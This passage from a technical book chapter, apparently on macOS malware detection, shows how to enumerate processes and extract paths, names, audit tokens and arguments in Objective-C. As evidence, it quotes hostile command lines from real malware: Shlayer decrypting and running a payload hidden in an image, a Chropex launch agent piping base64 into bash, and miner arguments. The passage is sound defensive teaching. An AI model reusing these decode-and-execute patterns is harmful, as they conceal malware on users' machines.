<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><section epub:type="chapter" role="doc-chapter" aria-labelledby="ch1">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_3" aria-label="3"/>&#13;
<hgroup>&#13;
&#13;
<h2 class="CHAPTER" id="ch1">&#13;
<span class="CN"><span class="SANS_Futura_Std_Bold_Condensed_B_11">1</span></span>&#13;
<span class="CT"><span class="Sans_Dogma_B">EXAMINING PROCESSES</span></span>&#13;
</h2>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt="" width="377" height="376"/></figure>&#13;
<p class="CO">The overwhelming majority of Mac malware executes as stand-alone processes continuously running on infected systems. As a result, if you generate a list of running processes, it’s more than likely to include any malware present on the system. Thus, when you’re trying to programmatically detect macOS malware, you should start by examining processes. In this chapter, we’ll first discuss various methods of enumerating running processes. Then we’ll programmatically extract various information and metadata about each running process to uncover anomalies commonly associated with malware. This information can include the full path, arguments, architecture, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_4" aria-label="4"/>process, hierarchy, code signing information, loaded libraries, open files, and much more.</p>&#13;
<p class="TX">Of course, the fact that a malicious process shows up in a listing doesn’t immediately allow you to determine that the process is indeed malicious. This is increasingly true as malware authors seek to masquerade their malicious creations as benign.</p>&#13;
<p class="TX">Most of the code snippets presented in this chapter are from the <i>enumerateProcesses</i> project, whose code you can download from this book’s GitHub repository. When executed with no arguments, this tool will display information about all running processes on your system; when executed with a process ID, it retrieves information about the specified process. To query a process, the privilege levels of your running code must match or exceed those of the target process, so security tools like this one often run with root privileges.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
&#13;
<h3 class="H1" id="sec1"><span id="h1-7"/><span class="SANS_Futura_Std_Bold_B_11">Process Enumeration</span></h3>&#13;
<p class="TNI">The easiest way to enumerate all processes on macOS is via <span class="SANS_TheSansMonoCd_W5Regular_11">libproc</span> APIs such as <span class="SANS_TheSansMonoCd_W5Regular_11">proc_listallpids</span>. As its name suggests, this API provides a list containing the process ID (<span class="SANS_TheSansMonoCd_W5Regular_11">pid</span>) of each running process. As arguments, it takes an output buffer and the size of this buffer. It will populate the buffer with the process IDs of all running processes and return the number of running processes.</p>&#13;
<p class="TX">How will you know how big the output buffer should be? One strategy is to first invoke the API with <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">0</span> as arguments. This will cause the function to return the number of currently running processes, which you can then use to allocate a buffer for subsequent calls. However, if a new process is spawned in the middle of this action, the API may fail to return its process ID.</p>&#13;
<p class="TX">Thus, it’s better just to allocate a buffer to hold the maximum number of possible running processes. Modern versions of macOS can generally hold several thousands of processes, but this number can be higher (or lower) depending on the specs of the system. Due to this variability, you’ll want to dynamically retrieve this maximum number from the <span class="SANS_TheSansMonoCd_W5Regular_11">kern.maxproc</span> system variable via the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctlbyname</span> API (<a href="chapter1.xhtml#Lis1-1">Listing 1-1</a>).</p>&#13;
<span id="Lis1-1"/>&#13;
<pre><code>#import &lt;libproc.h&gt;&#13;
#import &lt;sys/sysctl.h&gt;&#13;
&#13;
int32_t processesCount = 0;&#13;
size_t length = sizeof(processesCount);&#13;
&#13;
sysctlbyname("kern.maxproc", &amp;processesCount, &amp;length, NULL, 0);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-1: Dynamically retrieving the maximum number of running processes</span></p>&#13;
<p class="TX">Now that we have the maximum number of possible running processes, we simply allocate a buffer of this size multiplied by the size of each process ID. Then we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_listallpids</span> function (<a href="chapter1.xhtml#Lis1-2">Listing 1-2</a>).</p>&#13;
<span id="Lis1-2"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_5" aria-label="5"/>pid_t* pids = calloc((unsigned long)processesCount, sizeof(pid_t));&#13;
processesCount = proc_listallpids(pids, processesCount*sizeof(pid_t));&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-2: Generating a list of process identifiers for running processes</span></p>&#13;
<p class="TX">Now we can add print statements and then execute this code:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
Found 450 running processes&#13;
&#13;
PIDs: (&#13;
    53355,&#13;
    53354,&#13;
    53348,&#13;
    ...&#13;
    517,&#13;
    515,&#13;
    514,&#13;
    1,&#13;
    0&#13;
)&#13;
</code></pre>&#13;
<p class="TX">The code should return a list containing the process IDs of all running processes, as you can see from this run of the <i>enumerateProcesses</i> project.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
&#13;
<h3 class="H1" id="sec2"><span id="h1-8"/><span class="SANS_Futura_Std_Bold_B_11">Audit Tokens</span></h3>&#13;
<p class="TNI">Although process IDs are used system-wide to identify processes, they can be reused once a process exits, leading to a race condition where the process ID no longer references the original process. The solution to the process ID race condition issue is to use the process’s <i>audit token</i>, a unique value that is never reused. In subsequent chapters, you’ll see how macOS sometimes directly provides you with an audit token, for example, when a process is attempting to connect to a remote XPC endpoint or in a message from Endpoint Security. However, you can also obtain a processes audit token directly from an arbitrary process.</p>&#13;
<p class="TX">You’ll find the code to obtain an audit token in a function named <span class="SANS_TheSansMonoCd_W5Regular_11">getAuditToken</span> in the <i>enumerateProcesses</i> project. Given a process ID, this function returns its audit token (<a href="chapter1.xhtml#Lis1-3">Listing 1-3</a>).</p>&#13;
<span id="Lis1-3"/>&#13;
<pre><code>NSData* getAuditToken(pid_t pid) {&#13;
&#13;
    task_name_t task = {0};&#13;
    audit_token_t token = {0};&#13;
    mach_msg_type_number_t infoSize = TASK_AUDIT_TOKEN_COUNT;&#13;
&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> task_name_for_pid(mach_task_self(), pid, &amp;task);&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> task_info(task, TASK_AUDIT_TOKEN, (integer_t*)&amp;token, &amp;infoSize);&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_6" aria-label="6"/>  <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> return [NSData dataWithBytes:&amp;token length:sizeof(audit_token_t)];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-3: Obtaining an audit token for a process</span></p>&#13;
<p class="TX">First, the function declares required variables, including one of type <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token_t</span> to hold the audit token. It then invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">task_name_for_pid</span> API to obtain a Mach task for the specified process <span class="CodeAnnotation" aria-label="annotation1">❶</span>. You need this task for the call to <span class="SANS_TheSansMonoCd_W5Regular_11">task_info</span>, which will populate a passed-in variable with the process’s audit token <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Finally, the audit token is converted into a more manageable data object <span class="CodeAnnotation" aria-label="annotation3">❸</span> and returns it to the caller.<sup><a role="doc-noteref" id="chapter1_1" href="#chapter1-1">1</a></sup></p>&#13;
<p class="TX">Of course, a list of process IDs or audit tokens won’t tell you which, if any, are malicious. Still, you can now extract a myriad of valuable information. The next section starts with an easy one: retrieving the full path for each process.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
&#13;
<h3 class="H1" id="sec3"><span id="h1-9"/><span class="SANS_Futura_Std_Bold_B_11">Paths and Names</span></h3>&#13;
<p class="TNI">One simple way to look up the full path for a process from its process ID is via the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidpath</span> API. This API takes the ID of the process, an output buffer for the path, and the size of the buffer. You can use the constant <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDPATHINFO_MAXSIZE</span> to ensure the buffer is large enough to hold the path, as shown in <a href="chapter1.xhtml#Lis1-4">Listing 1-4</a>.</p>&#13;
<span id="Lis1-4"/>&#13;
<pre><code>char path[PROC_PIDPATHINFO_MAXSIZE] = {0};&#13;
proc_pidpath(pid, path, PROC_PIDPATHINFO_MAXSIZE);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-4: Retrieving the path of a process</span></p>&#13;
<p class="TX">There are also other ways to obtain the path of a process, some of which don’t require a process ID. We’ll cover an alternative approach in <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>, as it requires an understanding of various concepts related to code signing.</p>&#13;
<p class="TX">Once you’ve obtained a process’s path, you can use it to perform various checks that can help you determine whether the process is malicious. These checks can range from trivial, such as seeing whether the path contains hidden components, to more involved (for example, performing an in-depth analysis of the binary specified in the path). This chapter considers hidden path components, while the next chapter dives into full binary analysis.</p>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
&#13;
<h4 class="H2" id="sec4"><span id="h2-5"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Identifying Hidden Files and Directories</span></h4>&#13;
<p class="TNI">Information from the path can directly reveal anomalies. For example, a path containing either a directory or file component that is prefixed with a dot (.) will be hidden in the user interface and from various command line tools by default. (Of course, there are ways to view hidden items, for example, via the <span class="SANS_TheSansMonoCd_W5Regular_11">ls</span> command executed with the <span class="SANS_TheSansMonoCd_W5Regular_11">-a</span> flag.) From the malware’s perspective, remaining hidden is a good thing. However, this becomes a powerful detection heuristic, as benign processes are rarely hidden.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_7" aria-label="7"/>There are many examples of Mac malware executing from hidden directories or that are hidden themselves. For example, the cyber-espionage implant known as DazzleSpy,<sup><a role="doc-noteref" id="chapter1_2" href="#chapter1-2">2</a></sup> discovered in early 2022, persistently installs itself as a binary named <i>softwareupdate</i> in a hidden directory named <i>.local</i>. In a process listing, this directory sticks out like a sore thumb:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
Found 450 running processes&#13;
&#13;
(57312):/Applications/Signal.app/Contents/MacOS/Signal&#13;
(41461):/Applications/Safari.app/Contents/MacOS/Safari&#13;
(40214):/Users/User/<b>.local</b>/softwareupdate&#13;
(29853):/System/Applications/Messages.app/Contents/MacOS/Messages&#13;
(11242):/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock&#13;
...&#13;
(304):/usr/libexec/UserEventAgent&#13;
(1):/sbin/launchd&#13;
</code></pre>&#13;
<p class="TX">Of course, any heuristic-based approach is bound to have false positives, and you’ll occasionally encounter legitimate software that hides itself. For example, my Wacom drawing tablet creates a hidden directory, <i>.Tablet</i>, from which it persistently runs various programs.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
&#13;
<h4 class="H2" id="sec5"><span id="h2-6"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Obtaining the Paths of Deleted Binaries</span></h4>&#13;
<p class="TNI">On macOS, nothing stops a process from deleting the on-disk binary that backs it. Malware authors are aware of this option and may craft a program that self-deletes by stealthily removing its binary from the filesystem to hide it from file scanners, thus complicating analysis. You can see an example of this anomalous behavior in Mac malware such as KeRanger and NukeSped, the latter of which was used in the infamous 3CX supply chain attack.<sup><a role="doc-noteref" id="chapter1_3" href="#chapter1-3">3</a></sup></p>&#13;
<p class="TX">Let’s take a closer look at KeRanger, ransomware whose sole purpose is to encrypt a victim’s files and demand a ransom. As it performs both actions in a single execution of the process, it doesn’t need to keep its binary around once spawned. If you look at the disassembly of its main function, you can see that KeRanger’s first action is to delete itself via a call to the <span class="SANS_TheSansMonoCd_W5Regular_11">unlink</span> API:</p>&#13;
&#13;
<pre><code>int main(int argc, const char* argv[]) {&#13;
    ...&#13;
    unlink(argv[0]);&#13;
</code></pre>&#13;
<p class="TX">If a security tool obtains the process ID of the KeRanger process (perhaps because the ransomware’s actions triggered a detection heuristic), path recovery APIs such as <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidpath</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">SecCodeCopyPath</span> will fail. The first of these APIs, which normally returns the length of the process’s path, will in this case return zero with <span class="SANS_TheSansMonoCd_W5Regular_11">errno</span> set to <span class="SANS_TheSansMonoCd_W5Regular_11">ENOENT</span>, whereas <span class="SANS_TheSansMonoCd_W5Regular_11">SecCodeCopyPath</span> will directly return <span class="SANS_TheSansMonoCd_W5Regular_11">kPOSIXErrorENOENT</span>. This will tell you that the process’s binary has been deleted, which itself is a red flag, as benign processes normally don’t self-delete.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_8" aria-label="8"/>If you still want to recover the path of the now-deleted binary, your options are unfortunately rather limited. One approach is to extract the path directly from the process’s arguments. We’ll cover this option shortly, in <span class="Xref">“Process Arguments” on <a href="chapter1.xhtml#pg_9">page 9</a></span>. It’s worth noting, however, that once a process is launched, there is nothing stopping the process from modifying its arguments, including its path. Thus, the recovered path may have been surreptitiously modified to no longer point to the self-deleted binary.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
&#13;
<h4 class="H2" id="sec6"><span id="h2-7"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Validating Process Names</span></h4>&#13;
<p class="TNI">Malware authors know that their malicious programs will show up in Apple’s built-in Activity Monitor, where even a casual user may stumble across an infection simply by noticing a strange process name. As such, Mac malware often attempts to masquerade as either core macOS components or popular third-party software. Let’s illustrate this with two examples.</p>&#13;
<p class="TX">Uncovered in early 2021, ElectroRAT is a remote access tool (RAT) that targets cryptocurrency users.<sup><a role="doc-noteref" id="chapter1_4" href="#chapter1-4">4</a></sup> It attempts to blend in by naming itself <i>.mdworker</i>. On older versions of macOS, you’d often find several legitimate instances of Apple’s metadata server worker (<i>mdworker</i>) running. Malware can use this same name to avoid arousing suspicion, at least in the casual user.</p>&#13;
<p class="TX">Luckily, thanks to code signing (discussed briefly later in the chapter and in full detail in <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>), you can check that a process’s code signing information matches its apparent creator. For example, it is easy to detect that ElectroRAT’s <i>.mdworker</i> binary is suspicious. First, it isn’t signed by Apple, meaning it wasn’t created by developers in Cupertino. A binary that matches the name of a well-known macOS process but doesn’t belong to Apple is more than likely malware. Finally, because its name begins with a dot, ElectroRAT’s process file is also hidden, providing yet another red flag.</p>&#13;
<p class="TX">Another example is CoinMiner, a surreptitious cryptocurrency miner that leverages the Invisible Internet Project (I2P) for its encrypted communications. The network component that implements the I2P logic is named <i>com.adobe.acc.network</i> to mimic Adobe software, which is notorious for installing a myriad of daemons. By checking the process’s code signing information, you can see that Adobe hasn’t signed the binary.</p>&#13;
<p class="TX">You may now be wondering how to determine a process’s name. For nonapplication processes, such as command line programs or system daemons, this name usually corresponds to the file component. You can retrieve this component via the <span class="SANS_TheSansMonoCd_W5Regular_11">lastPathComponent</span> instance property if the full path is stored in a string or URL object. The code in <a href="chapter1.xhtml#Lis1-5">Listing 1-5</a>, for example, extracts ElectroRAT’s process name, <i>.mdworker</i>, and stores this in the variable <span class="SANS_TheSansMonoCd_W5Regular_11">name</span>.</p>&#13;
<span id="Lis1-5"/>&#13;
<pre><code>NSString* path = @"/Users/User/.mdworker";&#13;
NSString* name = path.lastPathComponent;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-5: Extracting ElectroRAT’s process name</span></p>&#13;
<p class="TX">If the process is an application, you can instantiate an <span class="SANS_TheSansMonoCd_W5Regular_11">NSRunningApplication</span> object via the <span class="SANS_TheSansMonoCd_W5Regular_11">runningApplicationWithProcessIdentifier:</span> method. <span role="doc-pagebreak" epub:type="pagebreak" id="pg_9" aria-label="9"/>This object will provide, among other things, the path to its application bundle in the <span class="SANS_TheSansMonoCd_W5Regular_11">bundleURL</span> instance property. The bundle contains a wealth of information, but what’s most relevant here is the app’s name. <a href="chapter1.xhtml#Lis1-6">Listing 1-6</a>, from the <span class="SANS_TheSansMonoCd_W5Regular_11">getProcessName</span> function in the <i>enumerateProcesses</i> project, illustrates how to do this for a given process ID.</p>&#13;
<span id="Lis1-6"/>&#13;
<pre><code>NSRunningApplication* application =&#13;
[NSRunningApplication runningApplicationWithProcessIdentifier:pid];&#13;
if(nil != application) {&#13;
    NSBundle* bundle = [NSBundle bundleWithURL:application.bundleURL];&#13;
    NSString* name = bundle.infoDictionary[@"CFBundleName"];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-6: Extracting an application name</span></p>&#13;
<p class="TX">From the <span class="SANS_TheSansMonoCd_W5Regular_11">NSRunningApplication</span> object, we create an <span class="SANS_TheSansMonoCd_W5Regular_11">NSBundle</span> object and then extract the application’s name from the bundle’s <span class="SANS_TheSansMonoCd_W5Regular_11">infoDictionary</span> instance property. If the process isn’t an application, the <span class="SANS_TheSansMonoCd_W5Regular_11">NSRunningApplication</span> instantiation will gracefully fail.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
&#13;
<h3 class="H1" id="sec7"><span id="h1-10"/><span class="SANS_Futura_Std_Bold_B_11">Process Arguments</span></h3>&#13;
<p class="TNI">Extracting and examining the arguments of each running process can shed valuable light on the actions of the process. They might also seem suspicious in their own right. An installer for the notorious Shlayer malware provides an illustrative example. It executes a bash shell with these arguments:</p>&#13;
&#13;
<pre><code>"tail -c +1381 \"/Volumes/Install/Installer.app/Contents/Resources/main.png\" |&#13;
openssl enc -aes-256-cbc -salt -md md5 -d -A -base64 -out /tmp/ZQEifWNV2l -pass&#13;
\"pass:0.6effariGgninthgiL0.6\" &amp;&amp; chmod 777 /tmp/ZQEifWNV2l ... &amp;&amp; rm -rf /tmp/ZQEifWNV2l"&#13;
</code></pre>&#13;
<p class="TX">These arguments instruct bash to execute various shell commands that extract bytes from a file masquerading as an image named <i>main.png</i>, decrypt them to a binary named <i>ZQEifWNV2l</i>, then execute and delete this binary. Though bash itself is not malicious, the programmatic extraction of encrypted, executable contents from a <i>.png</i> file indicates that something suspicious is afoot; installers don’t normally perform such obtusely obfuscated actions. We’ve also gained insight into the activities the installer takes.</p>&#13;
<p class="TX">Another example of a program with clearly suspicious arguments is Chropex, also known as ChromeLoader.<sup><a role="doc-noteref" id="chapter1_5" href="#chapter1-5">5</a></sup> This malware installs a launch agent to persistently execute Base64-encoded commands. A report from CrowdStrike<sup><a role="doc-noteref" id="chapter1_6" href="#chapter1-6">6</a></sup> shows an example of a Chropex launch agent, with a snippet reproduced here:</p>&#13;
&#13;
<pre><code>&lt;key&gt;ProgramArguments&lt;/key&gt;&#13;
&lt;array&gt;&#13;
    &lt;string&gt;sh&lt;/string&gt;&#13;
    &lt;string&gt;-c&lt;/string&gt;&#13;
    &lt;string&gt;echo aWYgcHMg ... Zmk= | base64 --decode | bash&lt;/string&gt;&#13;
&lt;/array&gt;&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_10" aria-label="10"/>The last argument string, beginning with <span class="SANS_TheSansMonoCd_W5Regular_11">echo</span>, consists of an encoded blob and a command to decode and then execute it via bash. It goes without saying that such an argument is unusual and a symptom that something is amiss (for example, that the system is persistently infected with malware). Once a detection program encounters this launch agent and extracts its very suspicious arguments, the program should raise a red flag.</p>&#13;
<p class="TX">As I mentioned earlier, extracting a program’s runtime arguments may provide insight into its functionality. For example, a surreptitious cryptocurrency miner found in the official Mac App Store masqueraded as an innocuous Calendar application (<a href="chapter1.xhtml#fig1-1">Figure 1-1</a>).</p>&#13;
<figure class="IMG"><img class="img1" id="fig1-1" src="../images/Figure1-1.jpg" alt="" width="1390" height="579"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 1-1: An innocuous calendar application, or something else?</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">To see that this app does more than meets the eye, we can examine process arguments. When the Calendar 2 application, <i>CalendarFree.app</i>, was executed, it would spawn a an embedded child program from within the <i>Coinstash_XMRSTAK</i> framework named <i>xmr-stak</i> with the following arguments:</p>&#13;
&#13;
<pre><code>"--currency",&#13;
"monero",&#13;
"-o",&#13;
"pool.graft.hashvault.pro:7777",&#13;
"-u",&#13;
"G81Jc3KHStAWJjjBGzZKCvEnwCeRZrHkrUKj ... 6ophndAuBKuipjpFiizVVYzeAJ",&#13;
"-p",&#13;
"qbix:greg@qbix.com",&#13;
...&#13;
</code></pre>&#13;
<p class="TX">Based on values like <span class="SANS_TheSansMonoCd_W5Regular_11">"--currency"</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">"monero"</span>, even casual readers should be able to tell that <i>xmr-stak</i> is a cryptocurrency miner. Although <i>xmr-stak</i> is a legitimate command line application, its surreptitious deployment via a free Calendar application hosted on Apple’s Mac App Store crosses a line.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_11" aria-label="11"/>&#13;
<blockquote>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>After I published a detailed blog post about this application,</i><sup><a role="doc-noteref" id="chapter1_7" href="#chapter1-7">7</a></sup> <i>Apple removed the app and updated the App Store’s Terms and Conditions to explicitly ban on-device mining.</i><sup><a role="doc-noteref" id="chapter1_8" href="#chapter1-8">8</a></sup></p>&#13;
<p class="TX">Finally, extracting a process’s arguments can aid you if you decide the process is suspicious and requires further analysis. For example, in early 2023, I discovered a malicious updater with ties to the prolific Genieo malware family that had remained undetected for almost five years.<sup><a role="doc-noteref" id="chapter1_9" href="#chapter1-9">9</a></sup> It turns out, though, that the persistent updater, named <i>iWebUpdate</i>, won’t execute its core logic unless it’s invoked with the correct arguments (such as <span class="SANS_TheSansMonoCd_W5Regular_11">update</span>, along with <span class="SANS_TheSansMonoCd_W5Regular_11">C=</span> and then a client identifier).</p>&#13;
<p class="TX">This means that if you’re attempting to analyze the <i>iWebUpdate</i> binary in a debugger and execute it without the expected arguments, it will simply exit. While static analysis methods such as reverse engineering could reveal these required arguments, it’s far simpler to extract them from the persistently running updater process on an infected system.</p>&#13;
<p class="TX">So, how do you retrieve the arguments of an arbitrary process? One way is via the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API invoked with <span class="SANS_TheSansMonoCd_W5Regular_11">KERN_PROCARGS2</span>. The <i>enumerateProcesses</i> project takes this approach in the aptly named <span class="SANS_TheSansMonoCd_W5Regular_11">getArguments</span> function. Given an arbitrary process ID, this function will extract and return its arguments. The function is rather involved, so I’ll break it into sections, starting with the calls to the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API (<a href="chapter1.xhtml#Lis1-7">Listing 1-7</a>).</p>&#13;
<span id="Lis1-7"/>&#13;
<pre><code>int mib[3] = {0};&#13;
int systemMaxArgs = 0;&#13;
&#13;
size_t size = sizeof(systemMaxArgs);&#13;
&#13;
mib[0] = CTL_KERN;&#13;
mib[1] = KERN_ARGMAX;&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> sysctl(mib, 2, &amp;systemMaxArgs, &amp;size, NULL, 0);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> char* arguments = malloc(systemMaxArgs);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-7: Allocating a buffer for process arguments</span></p>&#13;
<p class="TX">This API requires an output buffer to hold the process arguments, so we first invoke it with <span class="SANS_TheSansMonoCd_W5Regular_11">KERN_ARGMAX</span> to determine their maximum size <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Here, we specify this information in a management information base (MIB) array, whose number of elements are also passed as an argument to <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span>. Then we allocate a buffer of the correct size <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
<p class="TX">With the buffer allocated, we can now reinvoke the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API. First, though, we reinitialize the MIB array with values such as <span class="SANS_TheSansMonoCd_W5Regular_11">KERN_PROCARGS2</span> and the ID of the process whose arguments we’re interested in obtaining (<a href="chapter1.xhtml#Lis1-8">Listing 1-8</a>).</p>&#13;
<span id="Lis1-8"/>&#13;
<pre><code>size = (size_t)systemMaxArgs;&#13;
&#13;
mib[0] = CTL_KERN;&#13;
mib[1] = KERN_PROCARGS2;&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_12" aria-label="12"/>mib[2] = processID;&#13;
&#13;
sysctl(mib, 3, arguments, &amp;size, NULL, 0);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-8: Retrieving a process’s arguments</span></p>&#13;
<p class="TX">After this call, the buffer will contain the process arguments, among other things. <a href="chapter1.xhtml#tab1-1">Table 1-1</a> describes the structure of the buffer.</p>&#13;
<table class="Basic-Table1">&#13;
<caption><p class="TT" id="tab1-1"><span class="SANS_Futura_Std_Heavy_B_11">Table 1-1:</span> <span class="SANS_Futura_Std_Book_11">The Format of a</span> <span class="SANS_TheSansMonoCd_W5Regular_11">KERN_PROCARGS2</span> <span class="SANS_Futura_Std_Book_11">Buffer</span></p></caption>&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Number of arguments</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Process path</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Arguments</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">int argc</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">&lt;full path of process&gt;</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">char* argv[0]</span><span class="SANS_Futura_Std_Book_11">,</span> <span class="SANS_TheSansMonoCd_W5Regular_11">argv[1]</span><span class="SANS_Futura_Std_Book_11">, and so on</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">First, we can extract the number of arguments (traditionally called <span class="SANS_TheSansMonoCd_W5Regular_11">argc</span>). You can skip over the process path to get to the beginning of the arguments (traditionally called <span class="SANS_TheSansMonoCd_W5Regular_11">argv</span>), unless you have been unable to obtain the process path in another way. Each argument is <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> terminated, making extraction straightforward. The code in <a href="chapter1.xhtml#Lis1-9">Listing 1-9</a> shows how to do this by saving each argument as a string object in an array. Note that the <span class="SANS_TheSansMonoCd_W5Regular_11">arguments</span> variable is the now-populated buffer passed to the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API in <a href="chapter1.xhtml#Lis1-9">Listing 1-9</a>.</p>&#13;
<span id="Lis1-9"/>&#13;
<pre><code>int numberOfArgs = 0;&#13;
NSMutableArray* extractedArguments = [NSMutableArray array];&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> memcpy(&amp;numberOfArgs, arguments, sizeof(numberOfArgs));&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> parser = arguments + sizeof(numberOfArgs);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> while(NULL != *++parser);&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation4">❹</span> while(NULL == *++parser);&#13;
&#13;
while(extractedArguments.count &lt; numberOfArgs) {&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> [extractedArguments addObject:[NSString stringWithUTF8String:parser]];&#13;
    parser += strlen(parser) + 1;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-9: Parsing process arguments</span></p>&#13;
<p class="TX">The code first extracts the number of arguments (found at the start of the argument’s buffer) <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Then it skips over this value <span class="CodeAnnotation" aria-label="annotation2">❷</span>, the bytes of the path <span class="CodeAnnotation" aria-label="annotation3">❸</span>, and any trailing <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> bytes <span class="CodeAnnotation" aria-label="annotation4">❹</span>. Now the parser pointer is at the start of the actual arguments (<span class="SANS_TheSansMonoCd_W5Regular_11">argv</span>), which the code extracts one by one <span class="CodeAnnotation" aria-label="annotation5">❺</span>. It’s worth noting that the first argument, <span class="SANS_TheSansMonoCd_W5Regular_11">argv[0]</span>, will always be the program path unless the process has surreptitiously modified itself.</p>&#13;
<p class="TX">If we execute the <i>enumerateProcesses</i> project, it should display the following information when it encounters the aforementioned <span class="SANS_TheSansMonoCd_W5Regular_11">xmr-stak</span> process (shown here with a process ID of 14026), which surreptitiously mines cryptocurrency if an unsuspecting user has launched <i>CalendarFree.app</i>:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(14026):/Applications/CalendarFree.app/Contents/Frameworks/&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_13" aria-label="13"/>Coinstash_XMRSTAK.framework/Resources/xmr-stak&#13;
...&#13;
arguments: (&#13;
"/Applications/CalendarFree.app/Contents/Frameworks/Coinstash_XMRSTAK.&#13;
framework/Resources/xmr-stak",&#13;
"--currency",&#13;
"monero",&#13;
"-o",&#13;
